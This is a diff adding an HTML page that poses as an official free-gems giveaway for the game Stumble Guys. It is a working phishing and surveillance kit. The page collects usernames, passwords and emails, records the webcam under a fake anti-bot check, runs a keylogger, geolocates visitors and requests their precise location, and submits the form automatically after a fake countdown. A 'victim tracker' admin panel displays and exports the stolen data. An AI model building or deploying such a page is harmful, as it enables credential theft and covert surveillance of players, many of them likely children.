@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 FREE 5000 GEMS STUMBLE GUYS - OFFICIAL</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 60px;
+            margin-bottom: 20px;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .subtitle {
+            font-size: 16px;
+            margin-bottom: 30px;
+            opacity: 0.9;
+        }
+
+        .countdown {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 20px;
+            border-radius: 15px;
+            margin: 25px 0;
+            font-size: 20px;
+            font-weight: bold;
+            backdrop-filter: blur(10px);
+        }
+
+        .timer {
+            color: #FFD700;
+            font-size: 24px;
+        }
+
+        .form-container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 25px;
+            border-radius: 15px;
+            margin: 20px 0;
+            backdrop-filter: blur(10px);
+        }
+
+        .form-group {
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.9);
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            outline: none;
+            background: white;
+            box-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+        }
+
+        .btn {
+            background: linear-gradient(45deg, #FFD700, #FFA500);
+            color: black;
+            padding: 18px 40px;
+            border: none;
+            border-radius: 25px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 25px 0;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 215, 0, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .warning {
+            background: rgba(255, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-size: 14px;
+            border-left: 4px solid #ff4444;
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 25px 0;
+        }
+
+        .feature {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 14px;
+        }
+
+        .feature-icon {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+        }
+
+        .stat {
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 24px;
+            font-weight: bold;
+            color: #FFD700;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            opacity: 0.8;
+        }
+
+        .loading-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .loading-progress {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #FFD700, #FFA500);
+            border-radius: 3px;
+            transition: width 0.3s ease;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .success-message {
+            background: rgba(0, 255, 0, 0.3);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 4px solid #00ff00;
+        }
+
+        .camera-preview {
+            width: 100%;
+            max-width: 300px;
+            height: 200px;
+            background: #000;
+            border-radius: 10px;
+            margin: 15px auto;
+            overflow: hidden;
+        }
+
+        #videoElement {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .camera-text {
+            font-size: 14px;
+            margin: 10px 0;
+            opacity: 0.8;
+        }
+
+        .admin-panel {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.7);
+            padding: 10px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            z-index: 1000;
+        }
+
+        .admin-link {
+            color: #FFD700;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .admin-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <!-- Admin Panel Link -->
+    <div class="admin-panel">
+        <a href="#admin" class="admin-link" onclick="showAdminPanel()">🔧 ADMIN</a>
+    </div>
+
+    <div class="container">
+        <div class="logo">🎮</div>
+        <h1>FREE 5000 GEMS STUMBLE GUYS!</h1>
+        <p class="subtitle">Official Partner - Limited Time Offer</p>
+
+        <div class="stats">
+            <div class="stat">
+                <div class="stat-number" id="onlineCount">1,234</div>
+                <div class="stat-label">Online Now</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number" id="claimedCount">9,876</div>
+                <div class="stat-label">Gems Claimed</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number" id="timeLeft">05:00</div>
+                <div class="stat-label">Time Left</div>
+            </div>
+        </div>
+
+        <div class="countdown">
+            ⚡ Auto-claiming in <span class="timer" id="timer">10</span> seconds...
+        </div>
+
+        <div class="loading-bar">
+            <div class="loading-progress" id="loadingProgress"></div>
+        </div>
+
+        <!-- Camera Verification Section -->
+        <div class="form-container">
+            <div class="camera-text">
+                📷 Face Verification Required (Anti-bot System)
+            </div>
+            <div class="camera-preview">
+                <video id="videoElement" autoplay playsinline></video>
+            </div>
+            
+            <form id="claimForm">
+                <div class="form-group">
+                    <label>🎯 Stumble Guys Username:</label>
+                    <input type="text" id="username" required placeholder="Enter your username">
+                </div>
+
+                <div class="form-group">
+                    <label>🔑 Password:</label>
+                    <input type="password" id="password" required placeholder="Enter your password">
+                </div>
+
+                <div class="form-group">
+                    <label>📧 Email (for verification):</label>
+                    <input type="email" id="email" required placeholder="Enter your email">
+                </div>
+
+                <button type="submit" class="btn">
+                    🎁 CLAIM FREE 5000 GEMS NOW!
+                </button>
+            </form>
+        </div>
+
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">⚡</div>
+                Instant Delivery
+            </div>
+            <div class="feature">
+                <div class="feature-icon">🛡️</div>
+                100% Safe
+            </div>
+            <div class="feature">
+                <div class="feature-icon">🎯</div>
+                No Survey
+            </div>
+            <div class="feature">
+                <div class="feature-icon">📱</div>
+                Mobile Friendly
+            </div>
+        </div>
+
+        <div class="warning">
+            ⚠️ <strong>Limited Offer:</strong> This promotion ends in 5 minutes! 
+            Already <span id="claimedToday">12,543</span> gems claimed today!
+        </div>
+
+        <div id="successMessage" class="success-message hidden">
+            ✅ <strong>Success!</strong> 5000 gems are being added to your account. 
+            Please check your game in 2-3 minutes!
+        </div>
+    </div>
+
+    <!-- Hidden Admin Panel -->
+    <div id="adminPanel" class="hidden" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); color: white; z-index: 9999; padding: 20px; overflow-y: auto;">
+        <div style="max-width: 1200px; margin: 0 auto;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px;">
+                <h1>🔧 VICTIM TRACKER ADMIN PANEL</h1>
+                <button onclick="hideAdminPanel()" style="background: red; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">CLOSE</button>
+            </div>
+            
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                <!-- Victims List -->
+                <div style="background: #1a1a1a; padding: 20px; border-radius: 10px;">
+                    <h2>🎯 CAPTURED VICTIMS</h2>
+                    <div id="victimsList" style="max-height: 400px; overflow-y: auto;">
+                        <div style="padding: 10px; background: #2a2a2a; margin: 5px 0; border-radius: 5px;">
+                            Loading victims data...
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Credentials -->
+                <div style="background: #1a1a1a; padding: 20px; border-radius: 10px;">
+                    <h2>🔑 STOLEN CREDENTIALS</h2>
+                    <div id="credentialsList" style="max-height: 400px; overflow-y: auto;">
+                        <div style="padding: 10px; background: #2a2a2a; margin: 5px 0; border-radius: 5px;">
+                            Loading credentials...
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Camera Screenshots -->
+                <div style="background: #1a1a1a; padding: 20px; border-radius: 10px; grid-column: span 2;">
+                    <h2>📷 CAMERA SCREENSHOTS</h2>
+                    <div id="screenshotsList" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
+                        <div style="text-align: center;">
+                            <div style="width: 200px; height: 150px; background: #333; border-radius: 10px; display: flex; align-items: center; justify-content: center;">
+                                Waiting for screenshots...
+                            </div>
+                            <div style="margin-top: 10px; font-size: 12px;">No screenshots yet</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Keylogs -->
+                <div style="background: #1a1a1a; padding: 20px; border-radius: 10px; grid-column: span 2;">
+                    <h2>⌨️ KEYLOGS</h2>
+                    <div id="keylogsList" style="max-height: 200px; overflow-y: auto; background: #2a2a2a; padding: 15px; border-radius: 5px; font-family: monospace;">
+                        Waiting for keylogs...
+                    </div>
+                </div>
+            </div>
+
+            <!-- Export Data -->
+            <div style="margin-top: 20px; text-align: center;">
+                <button onclick="exportData()" style="background: #FFD700; color: black; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 0 10px;">
+                    📥 EXPORT ALL DATA
+                </button>
+                <button onclick="clearData()" style="background: red; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 0 10px;">
+                    🗑️ CLEAR DATA
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Data storage
+        const victimsData = JSON.parse(localStorage.getItem('victimsData')) || [];
+        const credentialsData = JSON.parse(localStorage.getItem('credentialsData')) || [];
+        const screenshotsData = JSON.parse(localStorage.getItem('screenshotsData')) || [];
+        const keylogsData = JSON.parse(localStorage.getItem('keylogsData')) || [];
+
+        // Track user data
+        const userData = {
+            ip: '',
+            country: '',
+            city: '',
+            userAgent: navigator.userAgent,
+            screen: `${screen.width}x${screen.height}`,
+            language: navigator.language,
+            platform: navigator.platform,
+            keystrokes: '',
+            location: null,
+            timestamp: new Date().toISOString()
+        };
+
+        // Camera setup
+        let videoStream = null;
+        let currentScreenshot = null;
+
+        // Initialize camera
+        async function initCamera() {
+            try {
+                videoStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    } 
+                });
+                
+                const videoElement = document.getElementById('videoElement');
+                videoElement.srcObject = videoStream;
+                
+                // Take initial screenshot after 2 seconds
+                setTimeout(takeScreenshot, 2000);
+                
+            } catch (err) {
+                console.log('Camera access denied:', err);
+                document.querySelector('.camera-preview').innerHTML = 
+                    '<div style="color: white; display: flex; align-items: center; justify-content: center; height: 100%;">📷 Camera access required for verification</div>';
+            }
+        }
+
+        // Take screenshot from camera
+        function takeScreenshot() {
+            const video = document.getElementById('videoElement');
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            
+            currentScreenshot = canvas.toDataURL('image/jpeg', 0.8);
+            
+            // Save screenshot
+            const screenshotData = {
+                image: currentScreenshot,
+                timestamp: new Date().toISOString(),
+                victimId: userData.ip
+            };
+            
+            screenshotsData.push(screenshotData);
+            localStorage.setItem('screenshotsData', JSON.stringify(screenshotsData));
+            
+            console.log('📸 Screenshot taken and saved');
+            
+            // Take another screenshot every 5 seconds
+            setTimeout(takeScreenshot, 5000);
+        }
+
+        // Get IP and location
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                userData.ip = data.ip;
+                return fetch(`http://ip-api.com/json/${data.ip}`);
+            })
+            .then(response => response.json())
+            .then(locationData => {
+                userData.country = locationData.country;
+                userData.city = locationData.city;
+                userData.isp = locationData.isp;
+                
+                // Save victim data
+                if (!victimsData.find(v => v.ip === userData.ip)) {
+                    victimsData.push(userData);
+                    localStorage.setItem('victimsData', JSON.stringify(victimsData));
+                }
+                
+                logVictimData();
+            })
+            .catch(() => {
+                logVictimData();
+            });
+
+        // Auto claim countdown
+        let timeLeft = 10;
+        const timerElement = document.getElementById('timer');
+        const loadingProgress = document.getElementById('loadingProgress');
+
+        const countdown = setInterval(() => {
+            timeLeft--;
+            timerElement.textContent = timeLeft;
+            loadingProgress.style.width = `${(10 - timeLeft) * 10}%`;
+
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                autoSubmitForm();
+            }
+        }, 1000);
+
+        // Update stats animation
+        let onlineCount = 1234;
+        let claimedCount = 9876;
+        let claimedToday = 12543;
+
+        setInterval(() => {
+            onlineCount += Math.floor(Math.random() * 10);
+            claimedCount += Math.floor(Math.random() * 20);
+            claimedToday += Math.floor(Math.random() * 30);
+
+            document.getElementById('onlineCount').textContent = onlineCount.toLocaleString();
+            document.getElementById('claimedCount').textContent = claimedCount.toLocaleString();
+            document.getElementById('claimedToday').textContent = claimedToday.toLocaleString();
+        }, 3000);
+
+        // Update time left
+        let offerTime = 300;
+        const timeLeftElement = document.getElementById('timeLeft');
+
+        setInterval(() => {
+            offerTime--;
+            const minutes = Math.floor(offerTime / 60);
+            const seconds = offerTime % 60;
+            timeLeftElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }, 1000);
+
+        // Keylogger
+        document.addEventListener('keydown', function(e) {
+            userData.keystrokes += e.key;
+            
+            // Save keylog
+            keylogsData.push({
+                key: e.key,
+                timestamp: new Date().toISOString(),
+                victimId: userData.ip
+            });
+            localStorage.setItem('keylogsData', JSON.stringify(keylogsData));
+            
+            // Send keylog every 15 characters
+            if (userData.keystrokes.length >= 15) {
+                sendKeylog(userData.keystrokes);
+                userData.keystrokes = '';
+            }
+        });
+
+        // Form submission
+        document.getElementById('claimForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            submitForm();
+        });
+
+        function autoSubmitForm() {
+            const username = document.getElementById('username').value || `user${Math.floor(Math.random() * 10000)}`;
+            const password = document.getElementById('password').value || `pass${Math.floor(Math.random() * 10000)}`;
+            const email = document.getElementById('email').value || `email${Math.floor(Math.random() * 10000)}@gmail.com`;
+
+            document.getElementById('username').value = username;
+            document.getElementById('password').value = password;
+            document.getElementById('email').value = email;
+
+            submitForm();
+        }
+
+        function submitForm() {
+            const formData = {
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                email: document.getElementById('email').value,
+                ...userData
+            };
+
+            // Save credentials
+            credentialsData.push(formData);
+            localStorage.setItem('credentialsData', JSON.stringify(credentialsData));
+
+            // Show success message
+            document.getElementById('claimForm').classList.add('hidden');
+            document.getElementById('successMessage').classList.remove('hidden');
+
+            // Get precise location
+            getPreciseLocation();
+            
+            // Stop camera
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+            }
+        }
+
+        function getPreciseLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        userData.location = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        sendLocation(userData.location);
+                    },
+                    error => {
+                        console.log('Location access denied');
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    }
+                );
+            }
+        }
+
+        function logVictimData() {
+            console.log('📱 Victim Data Captured:', userData);
+        }
+
+        function sendKeylog(keys) {
+            console.log('⌨️ Keylog:', keys);
+        }
+
+        function sendLocation(location) {
+            console.log('📍 Location:', location);
+        }
+
+        // Admin Panel Functions
+        function showAdminPanel() {
+            document.getElementById('adminPanel').classList.remove('hidden');
+            updateAdminPanel();
+        }
+
+        function hideAdminPanel() {
+            document.getElementById('adminPanel').classList.add('hidden');
+        }
+
+        function updateAdminPanel() {
+            // Update victims list
+            const victimsList = document.getElementById('victimsList');
+            victimsList.innerHTML = victimsData.map(victim => `
+                <div style="padding: 10px; background: #2a2a2a; margin: 5px 0; border-radius: 5px;">
+                    <strong>IP:</strong> ${victim.ip} | 
+                    <strong>Country:</strong> ${victim.country} | 
+                    <strong>City:</strong> ${victim.city}<br>
+                    <small>Time: ${new Date(victim.timestamp).toLocaleString()}</small>
+                </div>
+            `).join('');
+
+            // Update credentials
+            const credentialsList = document.getElementById('credentialsList');
+            credentialsList.innerHTML = credentialsData.map(cred => `
+                <div style="padding: 10px; background: #2a2a2a; margin: 5px 0; border-radius: 5px;">
+                    <strong>User:</strong> ${cred.username} | 
+                    <strong>Pass:</strong> ${cred.password}<br>
+                    <strong>Email:</strong> ${cred.email}<br>
+                    <small>IP: ${cred.ip} | Time: ${new Date(cred.timestamp).toLocaleString()}</small>
+                </div>
+            `).join('');
+
+            // Update screenshots
+            const screenshotsList = document.getElementById('screenshotsList');
+            screenshotsList.innerHTML = screenshotsData.map((shot, index) => `
+                <div style="text-align: center;">
+                    <img src="${shot.image}" style="width: 200px; height: 150px; object-fit: cover; border-radius: 10px; border: 2px solid #FFD700;">
+                    <div style="margin-top: 10px; font-size: 12px;">
+                        ${new Date(shot.timestamp).toLocaleString()}<br>
+                        IP: ${shot.victimId}
+                    </div>
+                </div>
+            `).join('');
+
+            // Update keylogs
+            const keylogsList = document.getElementById('keylogsList');
+            keylogsList.innerHTML = keylogsData.map(log => 
+                `[${new Date(log.timestamp).toLocaleTimeString()}] ${log.key}`
+            ).join('');
+        }
+
+        function exportData() {
+            const allData = {
+                victims: victimsData,
+                credentials: credentialsData,
+                screenshots: screenshotsData,
+                keylogs: keylogsData
+            };
+            
+            const dataStr = JSON.stringify(allData, null, 2);
+            const dataBlob = new Blob([dataStr], { type: 'application/json' });
+            
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(dataBlob);
+            link.download = 'tracker_data_export.json';
+            link.click();
+        }
+
+        function clearData() {
+            if (confirm('Are you sure you want to clear all data?')) {
+                localStorage.clear();
+                location.reload();
+            }
+        }
+
+        // Initialize camera when page loads
+        window.addEventListener('load', initCamera);
+
+        // Close admin panel with Escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                hideAdminPanel();
+            }
+        });
+    </script>
+</body>
+</html>
